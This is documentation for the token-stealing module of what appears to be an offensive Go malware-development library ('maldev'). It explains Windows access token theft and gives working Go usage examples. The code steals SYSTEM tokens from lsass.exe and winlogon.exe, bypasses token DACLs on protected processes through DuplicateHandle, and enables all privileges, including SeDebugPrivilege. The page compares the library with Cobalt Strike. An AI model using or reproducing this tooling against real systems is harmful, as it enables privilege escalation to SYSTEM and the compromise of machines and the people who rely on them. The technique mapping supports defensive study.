# Token Stealing

[<- Back to Tokens Overview](README.md)

**MITRE ATT&CK:** [T1134 - Access Token Manipulation](https://attack.mitre.org/techniques/T1134/)
**D3FEND:** [D3-TAAN - Token Authentication and Authorization Normalization](https://d3fend.mitre.org/technique/d3f:TokenAuthenticationandAuthorizationNormalization/)

---

## Primer

Every process on Windows runs under a security token that defines who it is and what it can do. A SYSTEM process has a powerful token; a regular user process has a limited one.

**Stealing someone's employee badge to access restricted areas.** Token theft duplicates the security token from a high-privilege process (like `lsass.exe` or `winlogon.exe`) and uses it to create new processes or perform actions with that identity. The original process is unaffected -- you have a copy of its badge.

---

## How It Works

### Token Theft Flow

```mermaid
sequenceDiagram
    participant Attacker as Attacker Process
    participant Target as Target Process (SYSTEM)
    participant Kernel as Windows Kernel

    Attacker->>Kernel: OpenProcess(PROCESS_QUERY_INFORMATION, targetPID)
    Kernel-->>Attacker: Process handle

    Attacker->>Kernel: OpenProcessToken(handle, TOKEN_DUPLICATE|TOKEN_QUERY)
    Kernel-->>Attacker: Token handle

    Attacker->>Kernel: DuplicateTokenEx(token, TOKEN_ALL_ACCESS,<br/>SecurityImpersonation, TokenPrimary)
    Kernel-->>Attacker: Duplicated token (new handle)

    Note over Attacker: Now holds a SYSTEM-level<br/>primary token

    Attacker->>Kernel: CreateProcessAsUser(dupToken, "cmd.exe")
    Note over Attacker: New cmd.exe runs as SYSTEM
```

### Three Theft Methods

```mermaid
flowchart TD
    START["Need a token"] --> Q1{"Know the\nprocess PID?"}

    Q1 -->|Yes| STEAL["Steal(pid)\nOpen process -> Open token -> Duplicate"]
    Q1 -->|No| Q2{"Know the\nprocess name?"}

    Q2 -->|Yes| STEALNAME["StealByName(name)\nEnum processes -> Find PID -> Steal"]
    Q2 -->|No| Q3{"Have process\nhandle with\nDUP_HANDLE?"}

    Q3 -->|Yes| DUPHANDLE["StealViaDuplicateHandle()\nDuplicate remote handle -> Duplicate token"]
    Q3 -->|No| INTERACTIVE["Interactive(type)\nWTS session -> QueryUserToken"]

    STEAL --> TOKEN["*Token"]
    STEALNAME --> TOKEN
    DUPHANDLE --> TOKEN
    INTERACTIVE --> TOKEN

    style STEAL fill:#4a9,color:#fff
    style STEALNAME fill:#49a,color:#fff
    style DUPHANDLE fill:#94a,color:#fff
    style INTERACTIVE fill:#a94,color:#fff
```

### DuplicateHandle Bypass

The `StealViaDuplicateHandle` technique bypasses the token's DACL by duplicating a handle from the remote process's handle table, rather than opening the token directly:

```mermaid
flowchart LR
    subgraph "Standard Steal"
        A1["OpenProcess"] --> A2["OpenProcessToken"]
        A2 -->|"DACL check"| A3["Token"]
        A2 -.->|"ACCESS_DENIED\n(protected process)"| FAIL1["Failed"]
    end

    subgraph "DuplicateHandle Bypass"
        B1["OpenProcess\n(PROCESS_DUP_HANDLE)"] --> B2["NtQuerySystemInformation\n(find token handles)"]
        B2 --> B3["DuplicateHandle\n(bypass DACL)"]
        B3 --> B4["DuplicateTokenEx"]
        B4 --> B5["Token"]
    end

    style FAIL1 fill:#f66,color:#fff
    style B5 fill:#4a9,color:#fff
```

---

## Usage

### Steal by PID

```go
import "github.com/oioio-space/maldev/win/token"

// Steal SYSTEM token from lsass.exe (PID 680)
tok, err := token.Steal(680)
if err != nil {
    log.Fatal(err)
}
defer tok.Close()

// Check the identity
details, _ := tok.UserDetails()
fmt.Println(details.Username) // "SYSTEM"
```

### Steal by Process Name

```go
// Find and steal token from winlogon.exe
tok, err := token.StealByName("winlogon.exe")
if err != nil {
    log.Fatal(err)
}
defer tok.Close()

// Check integrity level
level, _ := tok.IntegrityLevel()
fmt.Println(level) // "System"
```

### Steal via DuplicateHandle

```go
import (
    "golang.org/x/sys/windows"
    "github.com/oioio-space/maldev/win/ntapi"
    "github.com/oioio-space/maldev/win/token"
)

// Open process with PROCESS_DUP_HANDLE
hProcess, _ := windows.OpenProcess(
    windows.PROCESS_DUP_HANDLE, false, targetPID,
)
defer windows.CloseHandle(hProcess)

// Find token handle in remote process via NtQuerySystemInformation
// (remoteTokenHandle discovered via ntapi.FindHandleByType)
var remoteTokenHandle uintptr = 0x1234

tok, err := token.StealViaDuplicateHandle(hProcess, remoteTokenHandle)
if err != nil {
    log.Fatal(err)
}
defer tok.Close()
```

### Token Privilege Management

```go
tok, _ := token.Steal(targetPID)
defer tok.Close()

// Enable all privileges
tok.EnableAllPrivileges()

// Enable specific privilege
tok.EnablePrivilege("SeDebugPrivilege")

// List all privileges
privs, _ := tok.Privileges()
for _, p := range privs {
    fmt.Println(p) // "SeDebugPrivilege: Enabled"
}

// Check integrity level
level, _ := tok.IntegrityLevel()
fmt.Println(level) // "High", "System", etc.
```

---

## Combined Example: Token Theft + Process Creation

```go
package main

import (
    "context"
    "fmt"

    "github.com/oioio-space/maldev/win/privilege"
    "github.com/oioio-space/maldev/win/token"
)

func main() {
    // Check if we are admin
    isAdmin, isElevated, _ := privilege.IsAdmin()
    fmt.Printf("Admin: %v, Elevated: %v\n", isAdmin, isElevated)

    // Steal SYSTEM token from winlogon.exe
    tok, err := token.StealByName("winlogon.exe")
    if err != nil {
        fmt.Println("Token theft failed:", err)
        return
    }
    defer tok.Close()

    // Enable SeDebugPrivilege on the stolen token
    tok.EnablePrivilege("SeDebugPrivilege")

    // Verify identity
    details, _ := tok.UserDetails()
    fmt.Printf("Stolen identity: %s\\%s\n", details.Domain, details.Username)

    level, _ := tok.IntegrityLevel()
    fmt.Println("Integrity:", level)

    // Use the token to list all privileges
    privs, _ := tok.Privileges()
    for _, p := range privs {
        if p.Enabled {
            fmt.Println("  [+]", p.Name)
        }
    }
}
```

---

## Advantages & Limitations

### Advantages

- **Three theft methods**: Direct PID, by name, and DuplicateHandle bypass cover most scenarios
- **Full privilege management**: Enable, disable, remove individual or all privileges
- **DuplicateHandle bypass**: Circumvents token DACL restrictions on protected processes
- **Token introspection**: UserDetails, IntegrityLevel, Privileges, LinkedToken
- **Detach for lifetime management**: `tok.Detach()` transfers handle ownership to caller

### Limitations

- **SeDebugPrivilege required**: Stealing from SYSTEM processes requires debug privilege
- **Process must be accessible**: Cannot steal from PPL (Protected Process Light) without kernel exploit
- **Token is a copy**: Changes to the stolen token do not affect the original process
- **Detectable**: OpenProcess + OpenProcessToken is logged by ETW and most EDR products
- **Session 0 isolation**: SYSTEM tokens from Session 0 cannot interact with the user desktop

---

## Compared to Other Implementations

| Feature | maldev (win/token) | Incognito | Cobalt Strike | SharpToken |
|---------|-------------------|-----------|--------------|-----------|
| Language | Go | C | Java/C | C# |
| Steal by PID | Yes | Yes | Yes | Yes |
| Steal by name | Yes | Yes | Yes | Yes |
| DuplicateHandle bypass | Yes | No | No | No |
| Interactive token | Yes (WTS) | Yes | Yes | Yes |
| Privilege management | Yes (enable/disable/remove) | Limited | Yes | Yes |
| Linked token | Yes | No | No | Yes |

---

## API Reference

### Token Creation

```go
func Steal(pid int) (*Token, error)
func StealByName(processName string) (*Token, error)
func StealViaDuplicateHandle(hProcess windows.Handle, remoteTokenHandle uintptr) (*Token, error)
func OpenProcessToken(pid int, typ Type) (*Token, error)
func Interactive(typ Type) (*Token, error)
func New(t windows.Token, typ Type) *Token
```

### Token Methods

```go
func (t *Token) Token() windows.Token
func (t *Token) Close()
func (t *Token) Detach() windows.Token
func (t *Token) UserDetails() (TokenUserDetail, error)
func (t *Token) IntegrityLevel() (string, error)
func (t *Token) LinkedToken() (*Token, error)
func (t *Token) Privileges() ([]Privilege, error)
func (t *Token) EnableAllPrivileges() error
func (t *Token) DisableAllPrivileges() error
func (t *Token) RemoveAllPrivileges() error
func (t *Token) EnablePrivilege(priv string) error
func (t *Token) DisablePrivilege(priv string) error
func (t *Token) RemovePrivilege(priv string) error
```

### Types

```go
type Type int
const (
    Primary       Type  // Primary token for process creation
    Impersonation Type  // Impersonation token for thread-level
    Linked        Type  // Linked (elevated) token
)
```
